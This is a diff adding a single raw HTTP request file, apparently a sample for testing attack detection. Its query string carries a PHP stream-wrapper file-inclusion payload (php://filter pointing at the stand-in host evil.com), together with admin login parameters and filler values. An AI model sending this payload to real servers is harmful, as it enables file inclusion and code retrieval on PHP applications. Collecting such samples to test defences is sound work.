@@ -1,0 +1,7 @@
+GET /?param04b462=I@kdo9ijegieokf,kinkokdw0&login=admin&_token=ifwkaw-9ri0ofigjo9fgkiwn9df2o0kf0w9tgk30&coman=php://filter/read=string.rot13/resource=http://evil.com/index.php&parm2=fdna9rkif2ndfkigfji89rkfj29rk0hg3j98yhfile=login.php&password=fawikfiawgfiawkgiwaigkoiwg HTTP/1.1
+Host: 10.20.186.207:1111
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+
